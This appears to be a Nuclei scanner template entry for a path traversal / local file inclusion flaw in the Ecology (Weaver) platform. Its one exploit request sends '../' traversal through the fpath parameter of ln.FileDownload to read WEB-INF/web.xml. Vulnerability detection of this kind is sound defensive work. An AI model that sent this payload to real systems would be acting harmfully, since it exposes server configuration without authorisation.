# Nuclei Template: Ecology - Local File Inclusion
**Template ID:** ecology-filedownload-directory-traversal
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`ecology-filedownload-directory-traversal.yaml`)

## Vulnerability Information & PoC

## Description
Ecology is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml
```

